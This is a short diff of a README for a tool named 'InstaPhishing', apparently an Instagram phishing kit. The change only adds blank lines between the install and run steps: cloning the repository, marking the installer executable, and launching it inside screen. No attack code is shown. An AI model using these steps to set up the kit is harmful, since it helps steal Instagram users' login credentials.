@@ -13,20 +13,31 @@ But nothing else :-)
 Commands to install on a Fresh Ubuntu or Debian OS
 
 sudo apt update 
+
 sudo apt install git screen 
+
 git clone https://github.com/HasinduLanka/InstaPhishing.git 
+
 cd InstaPhishing 
+
 screen 
+
 chmod +x install 
+
 ./install 
+
 
 
 
 Commands to run
 
 cd InstaPhishing
+
 screen
+
 ./run
+
+
 
 You can switch between screens using [ctrl a n] and [ctrl a p] 
 
